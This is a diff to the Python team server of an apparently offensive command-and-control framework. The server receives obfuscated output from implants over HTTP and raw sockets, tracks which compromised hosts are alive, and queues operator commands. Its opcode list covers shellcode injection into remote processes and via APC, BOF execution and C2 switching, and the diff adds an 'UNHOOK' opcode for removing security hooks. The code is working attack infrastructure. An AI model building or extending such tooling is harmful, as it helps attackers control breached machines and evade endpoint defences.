@@ -1,6 +1,7 @@
 import socket, time
 import zlib, re, os, json
-import base64, shlex, random, threading
+from time import gmtime, strftime
+import base64, shlex, random, killthread, threading
 from tools import *
 from waitress import serve
 from flask import request, Flask
@@ -32,7 +33,8 @@ opcodes = """
     REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
     SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
     BOF_EXECUTE, //1//bof_execute file([bof file])
-    SWAP_C2 //?//swap_c2 [c2 method] ... [poll interval]
+    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
+    UNHOOK //0//auto remove hooks
 """
 c2s = """
     SOCKS,
@@ -40,7 +42,8 @@ c2s = """
 """
 std_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 url_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-
+def gettime():
+    return strftime("%Y-%m-%d %H:%M:%S", gmtime())
 @app.route("/document/<uid>" , methods=['GET'])
 def command(uid):
     global stacks, allout, outs
@@ -49,7 +52,7 @@ def command(uid):
             outs[uid] = ""
         datum = xor(base64.b64decode(request.args["data"].translate(str.maketrans(url_base64chars, std_base64chars)).encode("ascii")+b"==")).decode("charmap")
         outs[uid] += datum
-        allout += datum.replace("\n", "\n["+uid+"]: ")
+        allout += datum.replace("\n", "\n"+gettime()+" ["+uid+"]: ")
     elif "iv" in request.args:
         living[uid] = ["HTTP", time.time(), int(request.args["iv"])/1000]
         if uid in stacks:
@@ -64,10 +67,10 @@ def livers():
         nl = list(living.keys()).copy()
         for x in nl:
             if not x in ol:
-                allout += "\n["+x+"] connected!"
+                allout += "\n"+gettime()+" ["+x+"] connected!"
         for x in ol:
             if not x in nl:
-                allout += "\n["+x+"] died!"
+                allout += "\n"+gettime()+" ["+x+"] died!"
         ol = nl
         for x in living.copy():
             if len(living[x]) == 3:
@@ -107,7 +110,7 @@ def sockhand(conn):
         while d!=b"":
             datum = xor(d).decode("charmap")
             outs[uid]+=datum
-            allout += datum.replace("\n", "\n["+uid+"]: ")
+            allout += datum.replace("\n", "\n"+gettime()+" ["+uid+"]: ")
             try:
                 d = conn.recv(1000)
             except:
@@ -144,7 +147,7 @@ def alive():
     return json.dumps(a)
 @app2.route("/" , methods=['GET'])
 def index():
-    f=open("ui/index.html", "r")
+    f=open("server/ui/index.html", "r")
     r = f.read()
     f.close()
     return r
@@ -175,6 +178,6 @@ def cmdsend():
         return "ERRORS<br>"+stack[1].replace("\n", "<br>")
     return "ok\n"
 threading.Thread(target=livers).start()
-threading.Thread(target=sockserv).start()
-threading.Thread(target=httpserv).start()
+killthread.Thread(target=sockserv).start()
+killthread.Thread(target=httpserv).start()
 serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)
